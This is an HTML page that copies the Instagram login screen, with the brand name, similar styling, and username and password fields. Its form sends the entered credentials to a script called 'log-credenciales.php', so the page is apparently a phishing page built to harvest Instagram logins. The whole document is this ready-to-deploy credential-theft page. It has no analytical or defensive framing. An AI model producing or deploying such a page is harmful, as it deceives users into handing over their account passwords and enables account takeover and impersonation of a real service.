<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 320px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .logo {
      font-size: 36px;
      font-weight: bold;
      font-family: 'Arial Black', sans-serif;
      margin-bottom: 30px;
      color: #262626;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 5px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
    }

    button {
      width: 100%;
      padding: 8px;
      margin-top: 10px;
      background: #3897f0;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
    }

    .or {
      margin: 20px 0;
      display: flex;
      align-items: center;
      width: 100%;
    }

    .or::before,
    .or::after {
      content: '';
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }

    .or span {
      margin: 0 10px;
      font-size: 12px;
      color: #8e8e8e;
      font-weight: bold;
    }

    .signup {
      margin-top: 20px;
      font-size: 14px;
    }

    .signup a {
      text-decoration: none;
      font-weight: bold;
      color: #00376b;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">Instagram</div>
    <form action="log-credenciales.php" method="post">
      <input type="text" name="username" placeholder="Phone number, username or email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>

    <div class="or"><span>OR</span></div>

    <div class="signup">
      Don't have an account? <a href="#">Sign up</a>
    </div>
  </div>
</body>
</html>
